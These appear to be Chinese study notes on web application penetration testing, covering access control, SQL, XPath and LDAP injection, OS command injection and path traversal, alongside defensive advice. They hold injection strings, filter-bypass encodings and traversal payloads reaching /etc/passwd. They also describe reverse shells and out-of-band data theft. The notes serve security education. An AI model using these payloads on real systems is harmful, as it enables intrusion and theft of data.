资源的访问控制：首先使用一个用户确认当前用户可访问而其他用户无法访问的资源，然后尝试使用另外一个账户来访问这些资源，测试能否水平提升权限（请求相关的 URL 或提交相同的 POST 参数）； Burp Suite 提供使用两个不同的账户来解析应用程序的访问权限控制的功能，可以大大的提高效率； 渗透测试步骤 使用 A 账户正常访问应用程序的所有功能，记录下站点地图； 使用 B 账户访问站点地图中的所有功能，比对结果； 自动化工具此处只能用来收集信息，无法用于判断漏洞是否存在，需要结合应用程序功能访问的信息，才能进一步判断； 测试多阶段过程多阶段过程由于每个阶段之间存在一定的逻辑顺序关系，经常涉及很多请求，此时需要对过程中的每一个步骤都进行单独的测试，才能判断漏洞是否存在； 渗透测试步骤 在多阶段的过程中，对客户端发给服务端的每个请求，都进行单独的测试，确保每个请求都实施了正确的访问控制； 尝试使用低权限的账户到达某个阶段位置，检测是否可以实施权限提升的攻击； 使用高权限用户完成整个过程，记录下浏览器中的每个请求，之后使用权限较低的用户账号，对于保存的记录再次发起请求，看是否被应用程序允许； Burp 有个工具可以保存每次请求的上下文，然后可以生成一个自己的 URL，只要在浏览器中输入该 URL，Burp 就会调用保存的上下文，然后重要发送请求； 通过有限访问权限进行测试应用程序通常有一些隐藏的功能没有体现在界面中，但是却有可能可以访问； 渗透测试步骤 使用第4章的枚举尽可能多的功能； 如果确信应用程序可能会朋管理员的界面功能，可考虑在请求参数中增加 admin&#x3D;true 之类的字符，确定是否可以访问一些普通用户访问不到的功能； 检查应用程序是否基于 Referer 消息头进行访问控制；尝试删除 Referer 字段值，看是否应用程序会做出不同的反应，如果会的话，说明漏洞可能存在； 检查所有的客户端 HTML 与 JS 脚本，查找有没有隐藏的功能，或者可从客户端进行操纵的功能的引用； 在枚举出应用程序的所有功能后，开始测试应用程序是否正确的对资源进行访问控制；如果应用程序允许用户访问一组内容广泛的相同类型的资源，则用户有机会访问那些未授权的资源； 渗透测试步骤 尝试找到没有权限访问的资源的标识符； 如果有可能生成一系列紧密相连的标识符的话，则可以使用与会话令牌类似的技巧，尝试查找标识符的生成规律； 如果无法生成标识符，则只能通过分析现有的标识符来查找规律；如果标识符的位数比较少，则有可能成功；如很大则很难； 如果资源标识符可以预测，而且访问控制没做好，则可以使用自动化的工具快速获取敏感资源和信息； 如果服务端有将密码发送到客户端，即使不显示，也将是非常危险的，因为只要枚举用户名，就可以获得密码了； 测试“直接访问对象的方法”如果应用程序允许客户端直接调用服务端某个对象的方法（通常表现为传递对象的名称），例如 servlet&#x3D;com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug； 渗透测试步骤 确定任何遵循 Java 命名约定（例如 get, set, add, update, is, has+大写单词等），或明确指定包结构（如 com.companname.xxx.yyy.Classname）的参数； 找到列出对象所有方法的方法；先看该方法是否被调用，如果没有，则尝试猜测它的名称； 上网搜索一下相关的方法名称； 猜测其他可用方法的名称； 常用使用各种账户访问收集到的所有方法； 如果不知某个方法的参数数量和类型，则可以先找那些不需要参数的方法； 测试对静态资源的控制如果某些静态资源可以直接使用 URL 访问，则应该测试一下使用未授权账户是否也能够访问这些资源； 渗透测试步骤 先正常步骤访问某个静态资源，看最终能够获取到它的 URL； 使用权限较低或无权访问该资源的账户，对该 URL 发起请求，看能否成功； 如果可以成功，则开始猜测静态资源的命名方式；尝试设计一个自动枚举名称的脚本，进行自动攻击，获取所有可能有用或可能包含敏感数据的资源； 测试对 HTTP 方法实施的限制应用程序有可能并没有 HTTP 方法实施平台级控制； 渗透测试步骤 使用一个权限较高的账户登录，执行一些需要高操作权限的动作，例如添加用户、更改用户角色等功能； 确定这些操作是否有受到任何反 CSRF 令牌或类似功能的保护，如果 HTTP 的方法被修改，应用程序是否仍然能够完成请求的内容；待测试的方法包括：GET, POST, HEAD，以及任何无效的 HTTP 方法； 如果应用程序会执行用不同方法提交的请求，则使用低权限的账户，再次进行测试； 保障访问控制的安全 仔细评估应用程序每个功能单元的访问控制要求，包括谁能访问这些功能，以及用户通过这些功能能够访问哪些资源； 使用用户会话做出所有访问控制决定； 使用一个单独的组件检查访问控制；通过这个组件处理所有的每一个客户端请求，确认用户访问的资源是被允许的； 使用编程技巧确保前两项没有例外；例如规定每个页面的访问控制都必须通过公用组件来处理； 对于特别敏感的功能，例如管理员页面，可以增加 IP 地址的限制，确保只有内网中的用户可以访问该功能； 对于静态内容，有两种控制方法，一是通过让客户端传送文件名参数，由后端处理后，间接访问静态文件；二是使用 HTTP 验证，在允许访问前检查资源许可； 任何时候通过客户端传送的资源标识符，都需要对其授权重新确认； 对于安全性很高的功能，考虑对操作进行双重验证，进一步确认该功能举动被未授权方使用； 记录每一个访问敏感数据或执行敏感操作的事件，以便后续检测并调查潜在的非法访问事件； 多层权限模型除了对应用程序实施良好的访问控制实践，也应将这些实践或思路使用到基础设施中，例如：应用程序服务器、数据库、操作系统等； 数据库应增加多个账户，有些账户只有查询的权限，供应用程序中仅需查询的功能使用； 应在数据库中增加一个权限表，对数据库中不同的数据库表执行严格的访问控制； 只给每个操作系统账户分配最低权限，仅能运行所需的组件即可； 对于需要复杂权限的应用程序，应该设计一张权限矩阵表，进行清晰化的控制，示例如下： 常见的访问控制概念 编程控制：将数据库权限矩阵保存在一个数据库表中，并以编程的形式做出访问控制决定； 自主访问控制：由管理员分配资源权限给其他用户，分配规则可以是封装式（白名单），也可以是开放式的（黑名单） 基于角色的访问控制：创建很多命名的角色，给用户分配角色；使用角色对用户的请求进行检查； 声明式控制：应用程序使用有限的数据库账户访问数据库，每个账户仅分配到执行所允许操作的最低权限； 渗透测试步骤虽然使用多层控制模型的应用程序可以避免很多常见的访问控制漏洞，但是仍然有一些潜在的漏洞 应用程序的源代码有可能容易受到注入类的攻击； 角色定义不全面或不完整； 低权限的操作系统账户仍然可以访问敏感数据； 应用程序服务器软件本身存在漏洞； 某个小漏洞可能成为实现权限大提升的突破点； 小结许多时候，突破访问控制非常容易；有时在一些高度安全的应用中则很难；“四处看看”是攻击访问控制的最有效方法，如果能够耐心的测试应用程序的每一项功能，也许不久就可以发现一个能攻破整个应用程序的漏洞； 9. 攻击数据存储区注入解释型语言如果使用普通用户登录进行查询，然后使用数据库语言进行注入攻击，有可能直接绕开应用程序的访问控制检查； 渗透测试步骤 提交可能在解释型语言中引发问题的无效语法； 检查应用程序的响应，看是否存在代码注入漏洞的反常现象； 如果收到错误消息，从中获取服务端发生某种问题的证据； 系统性的修改初始输入，尝试确定或否定之前的漏洞假设； 构造一个漏洞验证框架，以可证实的方式执行某些安全的命令，收集证据，检查是否存在漏洞； 利用目标语言和组件的功能来实现攻击，对其中已公开的漏洞加以利用； 注入 SQL如果在本地安装一个与目标应用程序相同的数据库的话，会提高注入的效率，因为很多注入命令可以先在本地数据库进行尝试，观察并结合本地数据库的返回结果，之后再去猜测目标服务器的结果会更容易理解其内部发生的情况； 利用一个基本的漏洞基本原理是利用 SQL 解释型语言动态解释 SQL 语句的特点，在查询参数中添加单引号、注释符等在 SQL 中有意义的关键符号，使得语句进入解释器后，执行不同的查询操作； 123456# 输入项为 &quot;Reilly&quot;SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; and published=1# 修改输入项为 Reilly&#x27; OR 1=1--，查询语句变成如下SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; OR 1=1--&#x27; and published=1# 修改输入项为 Reilly&#x27; OR &#x27;a&#x27; = &#x27;a，查询语句变成如下SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; OR &#x27;a&#x27; = &#x27;a&#x27; and published=1 注入不同的语句类型SELECT 语句用来查询数据，一般配合 WHERE 使用； INSERT 语句用于插入数据行，攻击可利用漏洞来为自己创建管理员账户；有时不知道插入值需要多少个参数，此时需要挨个添加（添加整数1或2000），并进行测试； UPDATE 语句用于修改表中一行或多行的数据；UPDATE 与 INSERT 很像，区别在于多了 WHRER 部分来指定待更新的行； 对 UPDATE 的漏洞进行探查有很大的风险，因为它很有可能一不小心就修改了数据库里面的很多数据； DELETE 语句用于删除表中一行或者几行的数据；运行机制很像 UPDATE 语句，它同样也有很大的破坏当前数据库的风险； 查明 SQL 注入漏洞正常情况下，所有提交给服务端的参数，最终可能都会传递到数据库函数进行处理；因此，通过检查这些提交的数据项，发现可能存在的漏洞； 有时候应用程序会从多个请求中收集数据，待收集完整后，才会写入数据库，因此，如果有多阶段的过程，需要对该功能发送的所有数据进行遍历；如果只处理单个请求，则可能会遗漏漏洞； 注入字符串数据渗透测试步骤 提交一个单引号作为目标查询的数据，观察是否会造成错误，或查询结果与原始结果不同； 如果发现错误或者异常行为，在提交的数据中包含两个单引号（连着，单引号的转义），看会如何反应；如果错误或异常消失，则表明很可能有注入漏洞； 使用 SQL 连接符，在提交的数据中增加一个等同于正常输入的字符串，来进一步核实漏洞是否存在；不同数据库软件的连接符不同： MySQL: ‘ ‘FOO （注：两个引号之间有空格） MS-SQL: ‘+’FOO Oracle: ‘||’FOO 可在特定的查询参数中使用 SQL 通配符 %，看是否会返回更多的结果，如果是的话，说明提交的数据正与后端数据库交互； 在提交的输入中添加单引号后，如果服务端返回这个输入的话，会导致客户端的 js 脚本在处理它时出现报错；因为单引号在 js 里面也一个关键字符； 注入数字数据一般情况下，当数字参数传输到服务端时，一般应用程序会将其加单引号处理，但有时候也有可能没有处理，直接发给数据库软件； 渗透测试步骤： 尝试输入一个运算结果等于原始结果的算术表达式，例如原始值为2，则输入 3-1，或者 1+1；如果应用程序仍然能够正常反应，则存在注入漏洞； 如果前面的方法取得成功，则接下来可以使用更加复杂和特殊的 SQL 关键字和语法的表达式进一步探查该漏洞，例如使用 ASCII 命令来将字符或数字转成数值类型的 ASCII 码，例如 67-ASCII(A）等同于 67-65，也即等于2； 如果单引号被过滤掉，则前面的方法可能无效；此时可以利用数据库会解析 ASCII 命令的特点，例如：51-ASCII(1) 等于 51-49，也即等于2； 在使用特殊字符探查 SQL 注入漏洞时，需要提前留意一点，即输入是需要先被 HTML 编码之后，才会传输到服务端时，因此我们还需要将字符进一步转为 HTML 编码，才能达到预期的目标； &amp; 和 &#x3D; 在 HTML 中应该以 %26 和 %3d 来表示； 查询字符串不允许有空格，因此空格需要使用 %20 或者 + 来表示； 如果要在字符串中使用 + ，则需要使用 %2b 对其编码；例如：1+1 应以 1%2b1 进行提交； 分号用于分隔 cookie 字段，需要使用 %3b 对其编码； 注入查询结构在 SQL 语句中，有一些关键字，例如：ORDER BY, WHERE 等，这些关键字跟着一些列名，来达到预期的目标；而这些列名在有些应用程序中是由客户端提交的数据来指定的； 渗透测试步骤 记下任何可能控制应用程序返回的结果的顺序，或者结果的类型的参数； 提交一系列在参数值中使用数字值的请求，从数字1开始，然后逐个请求递增； 如果更改的数字会影响结果的顺序，则说明输入很可能被用于 ORDER BY 子句中，因为在 ORDER BY 之后的数字，表示按第几列进行排序；如果数字超过了总列数，则查询会失败；在数字后面使用 ASC – 或者 DESC – 来观察返回的结果是否顺序会变化； 如果提交的数字 1 生成一组结果，其中有一列都包含该数字，则表示该数字被用于插入到返回的结果的某一列中；即 SELECT 1, title, year FROM books WHERE publisher&#x3D;’Willy’ 虽然在 ORDER BY 之后接的是列名称，因此不能再注入 UNION, WHERE, OR, AND 等关键字，但可以指定一个嵌套查询来实现注入； “指纹” 识别数据库根据数据库使用哪种连接符，可以判断其使用的哪一种数据库；将原本某个正常的字符串参数，改成由连接符连接的格式，看服务端能否正常返回结果； 对于数字格式的参数，使用以下攻击字符串来识别，它在匹配的数字库中表示 0，在不匹配的数据库中则会出现错误； MySQL 在处理行内注释时，有一个特点，当行内注释以感叹号 ！开头时，表示进行版本号的判断，如果当前数据库的版本号大于等于注释中的版本号，则注释中的内容会被解析和执行；因此可以利用这一点，插入相应的语句，来识别数据库的版本，例如： UNION 操作符SQL 使用 UNION 将两个或多个的 SELECT 语句的查询结果合并起来；如果一个 SELECT 语句出现漏洞，意味着可以使用 UNION 来执行另一次完全独立的查询，并将其结果和第一次的查询结果组合到一起； 但是 UNION 也有一些限制： 查询结果的列数需要是相同的；每列的数据类型需要是兼容的； 需要知道另一个表的名称和列的名称； 渗透测试步骤 先查明所需的列数；利用 NULL 被转换为任何数据类型的这一特点，逐个增加 NULL 直到查询被执行； 第二项任务是找到一个数据类型为字符串的列，使用 ‘a’ 逐个取代一个 NULL，如果查询得到执行，将看到另一行包含 a 值的数据，然后可以使用相关列从数据库中提取数据； 提取有用的数据想获得有用的数据，需要知道列的名称；而列的名称经常保存在数据库元数据的表中（例如 MS-SQL 中的 information_schema.columns），通过查询该表来获得表和列的名称； 使用 UNION 提取数据 使用 NULL 找到列数； 查找元数据表，得到表名称和列名称； 开始提取数据 避开过滤避免使用被阻止的字符 使用 SQL 的内置函数来动态构建字符串， 如果注释符号被净化，可以设计为真的表达式； 避免使用简单确认有时候应用程序使用黑名单来净化，则是可以将注入的数据用复杂一些的表达式，例如： 使用 SQL 注释SQL 允许在行内插入注释，这意味着可以利用这个特性来避开净化，或者冒充空格； 利用有缺陷的过滤应用程序有可能没有使用递归的方式来过滤，因此可以增加一个外层骗过它； 二阶 SQL 注入有些应用程序允许用户的输入项中包含特殊的字符，当输入到达服务端时，应用程序会对其进行转义，这会导致注入失去效果；但是此时存在一些微妙的问题，存入数据库的特殊字符被转义了，但当下次它被查询并取出来的时候，有可能没有适当处理，然后可能再次帮为参数参加其他的 SQL 查询，此时将触发一个漏洞； 原理：将 SQL 注入语句先做为正常值存起来，然后再调用查询的命令将把它取出来，从而触发注入； 高级利用有些攻击者不一定使用注入来获取数据，它甚至有时候用来破坏数据库； 获取数字数据可利用 ASCII 和 SUBSTRING 两个函数将字符转成数字；这样如果想得到一串数字，可以用字符串转化并拼接出来； 使用带外通道虽然有时候可以实现注入查询，但是查询的结果却不一定被应用程序返回给浏览器，但是可以利用数据库的内置功能，让它与攻击者设立的目标数据库建立连接，将查询结果传输到攻击者创建的数据库； MS-SQL 的 openrowset 功能； Oracle 的各种包，包括 UTL_HTTP 、UTL_INADDR、UTL_SMTP、UTL_TCP； MySQL 的 INTO OUTFIL 命令可以将结果写入一个文件，通过在两台计算之间建立 SMB 共享，可以实现文件的匿名写入； 另外通过提升数据库权限，还可以利用操作系统的功能来和外部建立连接以传送数据； 使用推论：条件式响应由于防火墙的关系，有时候带外通道并一定能够成功；此时还有另外一种比较费劲的办法，即通过设置不同的查询条件，应用程序会出现不一样的行业，来判断自己所猜测的信息是否是命中了；例如让数据库报错，此时应用程序有可能会返回 500 的错误，从而得到反馈； SELECT X FROM Y WHERE C，当条件 C 满足时，才会求 X 表达式的值，如果 C 不满足，则不会触发 X 表达式的计算；此时，我们可以设置 X 表达式为一个求值会报错的表达式，例如进行除零云计算，这样我们就可以在 C 中放置我们想探查的信息，如果查询成功，就会触发报错；如果查询失败，则不会触发报错； 我们可以逐个字节的探查猜测是否正确，例如对于字符串类型的用户名，我们可以探查第一个字母是否为 A，如果不是就看是否为 B，以此类推；当猜测出来后，再开始探查第二个字母，不断循环；使用这种方法可以探查数据库中的每一条记录； 使用时间延迟猜测的依据除了建立在应用程序是否报错的基础上，也可以建立在应用程序的响应时间上；例如不同数据库有内置不同的延迟命令，可以调取这个命令来制造时间延迟；有些数据库没有时间延迟函数，这时可以让它作一次密集运算，或者让它连接一个不存在的服务器来增加延迟； SQL 注入之外：扩大数据库攻击范围除了应用程序外，数据库本身也是存在漏洞的；因此，除了攻击应用程序本身，还可以通过攻击数据库服务器来达到相同的目的； MS-SQLMS-SQL 有一个内置的 xp__cmdshell 功能，可以使用数据库账户执行系统级的命令，中，虽然默认情况下，该功能是关闭的，但是如果应用程序的账户拥有足够大的权限，则它可以通过开启这项功能，然后利用它来完全控制数据库服务器的操作系统； OracleOracle 的漏洞更多，只要通过实现 SQL 注入，就大概率可以利用其漏洞控制整个数据库； MySQL与前面两个数据库相比，MySQL 中可用攻击者利用的内置功能相对比较少；MySQL 允许读取或写入文件到文件系统中；因此如果数据库账户拥有 FILE_PRIV 权限，则可以打开相关文件访问数据库中的任何数据； 另外 MySQL 允许用户打开动态库文件，因此攻击者可提前创建一个能够实现自己目的的二进制文件，然后通过 MySQL 去读取它，间接实现命令的执行； 使用 SQL 注入工具探测 SQL 注入漏洞的过程需要提交大量的请求，目前已经有这方面的自动化工具，但这些工具还没有达到智能化的程度，在使用前，需要攻击者做一些设置，才能够更有效的提高攻击效率和成功率； SQL 语法与错误参考SQL 语法不同的数据库语法之间有一些差别，因此需要因地制宜，使用匹配后端数据库的语法； SQL 错误消息不同的数据库其报错的消息格式和内容也不一样，并且这些报错消息意味着不同的漏洞可能性； 防止 SQL 注入部分有效的防御措施 对用户输入的所有单引号进行配对； 使用存储过程； 参数化查询 指定查询结构，预留占位符； 指定每个占位符的内容； 深层防御 当应用程序访问数据库时，应尽量采用最低权限的账户； 尽量删除或禁用数据库的那些不必要的功能；内置功能越强大越多，漏洞也越多； 及时安装数据库软件的补丁； 注入 NoSQLNoSQL 虽然是非关系型数据库的统称，但是其实涵盖很多种类型的数据库，每一种数据库的使用方式都完全不同，因此针对不同的 NoSQL 数据库需要使用不同的攻击方法； 作者在写作这本书的时候，这方面的研究才刚开始，但现在这个阶段估计应该有一些成功的办法了； 注入 XPathXPath 是一个处理 XML 文档的工具，用来从 XML 文档中读取或写入数据；但是 XML 并不是保存应用程序数据的传统方式，它一般用来保存一些配置类型的数据为主，或一些简单的信息，例如角色、权限等； XPath 注入的方式跟 SQL 差不多，例如都同样可以使用条件判断逐个字节的获得信息；XPath 同样也有一些内置的函数可供利用； 有时候我们并不知道后面是否使用 XPath，但如果发现某个 SQL 漏洞，但却无法加以利用，则应考虑一下 XPath 的可能； 注入 LDAPLDAP 是 lightweight directory access protocol 的简称，表示轻量级的访问协议，它用来提供访问网络中的目录； LDAP 使用一些逻辑运算符来做条件判断；由于它独特的语法形式，常规的 SQL 注入技巧在 LDAP 并不适用；通常来说， LDAP 的注入难度更大一些；不过如果结合其语法来提交输入，也是存在注入的可能； LDAP 在处理 NULL 字节方面存在漏洞，该单词在 LDAP 表示字符串终止；攻击者可以利用这个漏洞，达到和 SQL 的注释符相同的效果； 小结本章提到的攻击方式只是注入攻击的冰山一角，如果攻击者利用这类漏洞，将能够在服务器的操作系统上执行命令、检查任意文件，即利用应用程序的漏洞攻破并控制为应用程序提供环境的组件； 10. 攻击后端组件一般来说，很多 Web 应用程序被作为后端服务的中间层，客户端通过访问这个中间层，间接实现对服务器上其他底层组件（例如文件系统）和进程的访问；虽然 Web 应用程序本身设置了安全机制，但是对于应用程序来说安全的数据，有可能对于底层组件来说并不是安全的。攻击者有可能利用该漏洞，绕过应用程序的检查，实现对底层组件的调用和控制； 注入操作系统命令有些应用程序会基于用户的输入，生成相应的命令，发送给操作系统执行，这将可能被攻击者利用的漏洞，因为可以设计专门的输入，修改开发者想要执行的命令；这类漏洞特别经常出现在为内部人员提供管理服务器的界面的应用程序中，因为这类管理需求需要直接跟操作系统打交道； 有些命令使用的是字符串拼接的方式，然后发给脚本语言本身提供的系统调用函数来执行；有些脚本语言使用 eval 函数将字符串解析为待执行的代码； 查找 OS 命令注入漏洞不同的 shell 解释器有不同的字符处理方式，应用程序调用的 shell 有很多种可能性，因此需要先想方法对假设进行验证； 可在原命令中注入新命令的字符： ; | &amp; 等三个字符可用于将几个命令连接起来；而且在不同的 shell 解释器中，成对使用它们可达到不同的效果； 反引号 &#96; 可用于将一个独立的命令包含在最初命令处理的数据中；例如把一个注入命令放在反引号中，shell 就会先执行该命令，然后用执行的结果代替被反引号包含的文本，然后执行替代后的新命令字符串； 注入命令的一个常见问题是执行的结果并不会返回，因此并不知道注入是否成功，但是只要漏洞存在，就会有一些探查的方法，例如通过时间延迟来判断； 渗透测试步骤 通过 ping 及其时间参数，让操作系统在接下来的一段时间访问本地的回环接口（即 127.0.0.1）来制作延迟； 如果发生时间延迟，则说明漏洞有可能存在；接下来可以通过命令选项 -i 或 -n 逐渐递增间隔或次数，观察延迟的时间是否跟着增加；如果是的话，说明漏洞很大可能存在，同时也可以排除延迟是因为网络造成的； 使用可成功实施攻击的注入字符串，尝试注入更有用的命令（例如 ls 或 dir），看是否能够将命令结果返回到浏览器上； 如果无法将结果返回给浏览器，则可以尝试建立带外通道 例如使用 TFTP 将工具上传到服务器，使用 telnet 或 netcat 建立一个和自己的计算相连接的反向 shell，然后使用 mail 命令通过 SMTP 发送命令执行结果； 可以将命令的结果重定向的某个可以公开访问的静态资源文件夹，然后通过浏览器访问它； 一量找到注入命令的方法并能够获得命令执行结果，接下来应当确定自己的权限（例如使用 whoami 命令，或者尝试给某个写保护的文件夹写入一个无害的文件）；确定权限后，就设法提升自己的权限，或者借由该服务器攻击其他主机； 有时候应用程序会过滤掉某些符号和字符，导致无法注入独立的系统命令；尽管如此，攻击者仍然有机会破坏开发者设定的命令行为；例如通过故意提供错误的输入，让命令报错，并将错误重定向到某个可执行文件中；而攻击者提供的错误输入，可能故意夹杂着可执行代码；随后通过浏览器访问可执行文件，执行混入的代码； &lt; 和 &gt; 两个符号可以用来重定向，当不能执行独立的命令时，如果这两个符号可用，则可以利用它们来读取或写入任意的文件内容； 操作系统的命令通常支持大量的参数，参数之间同样使用空格间隔；如果应用程序基于用户的输入来生成这些参数，则可以通过在参数中混入空格，然后提供额外的参数，实现攻击效果，例如利用 -O 参数将内容写入任意的文件； 有时应用程序会过滤空格，此时可以通过调用包含空格符字段的环境变量 $IFS 来实现空格的效果； 查找动态执行漏洞动态执行漏洞常见于 PHP 和 Perl 等语言；但绝大多数应用程序平台都可能向基于脚本的解释器传送用户提供的输入； 渗透测试步骤 理论上用户提供的任何数据都可以提交给动态执行函数；其中最常见的数据项是是cookie 名称和参数值； 尝试轮流向目标参数提交下列值，观察它们的返回结果 ;echo%20111111 echo%20111111 response.write%20111111 :response.write%20111111 如果字符串 111111 被单独返回，说明该字符串前面没有其他字符串，因此该处可能存在注入漏洞； 如果字符串 111111 未被返回，说明存在其他字符串，此时应寻找输入被动态执行的错误消息；根据需要对语法进行调整，以实现注入任意的命令； 如果攻击的应用程序是 PHP，可以使用测试字符串 phpinfo()；如果它被成功执行，会返回 PHP 的配置信息； 如果应用程序可能存在注入漏洞，则同样可以通过制造延迟的方法来确认漏洞的存在，例如：system(‘ping%20127.0.0.1’) 防止 OS 命令注入防止 OS 命令注入的最好办法是一劳永逸的避免在程序中直接调用操作系统的命令，而是改由调用内置的 API 来实现；如果实在无法做到，则应该对用户的输入进行严格的控制，例如增加一份白名单，限制长度，并只需要字母和数字，不得包含任何的符号； 应用程序应尽量使用内置的 API 的名称和参数来启动目标进程，而不是直接向 shell 解释器传递命令字符串，这样可以利用内置 API 的检查机制来增加额外的保护； 防止脚本注入漏洞最佳方法是避免将任何用户提供的输入，直接传给任何动态执行函数；如果无法做到，则应该建立严格的白名单； 操作文件路径有些 Web 应用程序提供某个功能，该功能支持接受用户输入的一个文件名或者路径名，然后应用程序调用系统的 API 查找或读取该文件或目录；如果没有对用户提交的输入进行严格的检查，就有可能存在注入的漏洞； 路径遍历漏洞有些 Web 应用程序根据客户端提交的文件名，通过拼接路径的方式，读取并返回服务器上存储的静态文件（或者是将数据写入到服务器上面）；攻击者可以在文件名参数中加入 .. （点点）符号，来遍历整个文件树，读取甚至修改一些敏感信息，从而获得整个服务器的控制权； 虽然这种漏洞形式被广泛应用，常见的 Web 应用框架会采取一些防御措施，例如对客户端的输入进行过滤；但是这仍然无法阻止技术熟练的攻击者。 查找和利用路径遍历漏洞确定攻击目标在对应用程序分析的步骤中，一般就需要确定潜在的攻击面，主要用于文件的上传和下载的功能（例如可共享文档的应用程序、允许用户上传图像的博客、商品信息上传的拍卖平台、为用户提供电子书、技术手册、公司报表等信息型应用程序）；这些功能都有一个特征，即需要跟文件系统进行交互； 渗透测试步骤 在解析应用程序功能的过程中，留意在请求参数中带有文件名或目录名的情形，例如 include&#x3D;main.inc 或者 template&#x3D;&#x2F;en&#x2F;sidebar；或者需要从服务端的文件系统中读取数据的功能，例如显示和下载图像； 在测试其他漏洞的过程中，留意一些反常事件或者有益的错误消息，看看是否有可能是因为用户提交的数据被传递给文件系统的 API 或者作为操作系统命令的参数； 探查路径遍历漏洞当找到潜在的攻击目标后，设法确定漏洞是否存在，例如可以提交一个不会回溯到起始目录的遍历序列，例如将 file&#x3D;foo&#x2F;file.txt 参数修改为 file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt； 如果服务端返回相同的结果，则说明漏洞很可能存在； 如果返回结果不同，则说明应用程序有对输入进行一定的过滤处理；此时需要找到过滤的规则，看是否有可能绕过它； 如果发现漏洞可能存在，则尝试遍历出起始目录，例如可提交参数： 12../../../../../../n.ini# 注：此处 ../ 的数量需要反复试验 如果幸运的话，有可能得到如下结果： 如果所攻击的功能拥有文件的写入权限，则可能不好确定该功能是否存在漏洞；因此需要确定一下写入的权限具体有多大；确定的办法是写两个文件：一个是任意用户均可实现写入的文件，另一个是即使根用户或者管理员也无法写入的文件；如果两次请求之间，应用程序表现出差异，则说明漏洞存在； 关于文件路径的分隔符，Win 平台同时支持斜杠和反斜杠，但是 Unix 平台则只运行斜杠，因此最好二者都进行测试，以便能够覆盖并确认服务端使用的是哪种平台，或者哪种平台组件来 避开遍历攻击障碍 应用程序可能只过滤一种序列，因此应同时尝试斜杠和反斜杠，因为文件系统两种格式都支持； 对遍历序列进行 URL 编码，例如点使用 %2e，斜杠使用 %2f，反斜杠使用 %5c 尝试使用 16 位的 Unicode 编码，例如点使用 %u002e，斜杠使用 %u2215，反斜杠使用 %u2216 尝试使用双倍 URL 编码，例如点使用 &amp;252e，斜杠使用 &amp;252f，反斜杠使用 %255c 尝试使用超长 UTF-8 编码，例如点使用 %c0%2e, %e0%40%ae, %c0ae；斜杠使用 %c0%af, %e0%80%cf, %c0%2f；反斜杠使用 %c0%5c, %c0%80%5c 等； 有很多字符可以使用非法的 Unicode 表示法来表示，它们被许多 Unicode 解码器识别并接受，尤其是 Windows 平台上面的解码器； 服务端正常应使用递归来净化客户端提交的输入，但有可能应用程序没有这么做，此时可以输入双序列，这样被过滤掉一个，仍然可以剩下一个发挥作用，例如： …. &#x2F;&#x2F; 指定后缀服务端有时使用指定后缀的方式来检查客户端提交的请求，渗透测试步骤： 在文件名和合法后缀之间放入一个使用 URL 编码的空字符，例如 “..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”；该方法能够生效的原因在于进行文件名检查的执行环境，和最终查找获取文件的环境不同，前者认为合法的字符串，到了获取环境变成了另外一种意思； 有些应用程序会只使用请求中的文件名，不包括后缀，然后自行在代码逻辑中添加后缀，这种情况下，前述的方式仍然可以起作用； 有些应用程序会检查文件名的开头是否是一个合法的目录，这种情况只需要配套使用双点即可避免检查，例如：filestore&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwc； 如果以上针对输入过滤的渗透都无法成功，则应用程序可能实施了多加复合的过滤方式，此时可以先从一个可以成功的请求做为起点，例如 foo.jpg，然后请求 bar&#x2F;..&#x2F;foo.jpg 如果失败的话，则尝试所有可能的遍历序列方式，直到该请求获得成功为止；如果仍然还是不行，则尝试请求 foo.jpg%00.jpg，看是否能够避开过滤；彻底检查应用程序的默认目录，了解它使用的所有过滤方式，然后针对这些过滤方式设计避开的技巧； 处理定制编码有些应用程序会对用户上传文件的文件名使用某种编码方案后，再返回编码后的名称做为访问该文件的 URL 地址；因此，可以利用该编码方案是否对路径进行规范化的漏洞来尝试获取想要的文件； 先通过简单的文件名，测试编码方案，例如上传文件 test.txt，看它编码后的结果，例如为 zM1YTU4NTY2Y； 再尝试上传文件 foo&#x2F;..&#x2F;test.txt，看它编码后的结果是否仍为上一步的结果，还是长度有变化，如果有变化，则意味着应用程序没有对路径进行规范化，因此有漏洞； 尝试提交 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;etc&#x2F;passwd&#x2F;..&#x2F;..&#x2F;tmp&#x2F;foo，它规范化的形式为 &#x2F;tmp&#x2F;foo，得到它的编码结果，然后截短它，以便得到路径的前半部分，这样就可以用来获取 &#x2F;etc&#x2F;passwd 文件；（此处需要留意编码对齐问题，因为类似 Base64 的编码方案是以三个字符为单位的，因此需要在路径中添加合适数量的点号来凑齐字符单位要求，同时不影响结果）； 利用遍历漏洞当发现一个路径遍历漏洞后，通常攻击在服务器上将拥有和应用程序相同的读写权限；该漏洞可以用来做如下事情： 获取操作系统与应用程序的密码文件； 获取服务器和应用程序的配置文件（可用来发现其他漏洞或优化其他攻击）； 可能获取数据库证书文件； 应用程序的数据源，例如 MySQL 数据库文件或 XML 文件； 服务器可执行页面的源代码（可用来做代码审查，搜索代码中的其他漏洞）； 可能包含用户名和会话令牌的应用程序日志文件； 如果发现一个可写入任意的漏洞，则可以利用它在服务器上执行任意命令； 在用户的启动文件夹中创建脚本； 当用户下一次连接时，修改 in.ftpd 等文件执行任意命令； 向一个拥有执行权限的 Web 目录写入脚本，然后通过浏览器访问它们，触发脚本的执行； 防止路径遍历漏洞避免向文件系统传递任何用户提交的数据，是防御路径遍历漏洞的最好办法；如果必须允许用户指定上传文件的名称，则需要设置多重的防御组合： 在对用户提交的文件名进行解码和规范化后，应检查文件名中是否包含路径遍历序列（例如斜杠和反斜杠）和空字节；如果有的话，则判定为恶意请求并停止处理，不得尝试对其进行净化； 应用使用应使用一个硬编码的可访问文件类型的列表，并拒绝访问其他类型文件的请求； 在进行过滤后，应用程序应检查文件是否位于指定的目录中（例如使用 get_full_path 之类的方法，获取文件的绝对路径，然后进行检查）；如果发现不在指定目录，则停止处理请求； 应用程序可使用 chrooted 文件系统来包含被访问文件的目录，该目录会自动忽略尝试向上遍历的请求（大多数 Linux 版本都支持 chrooted 文件系统）； 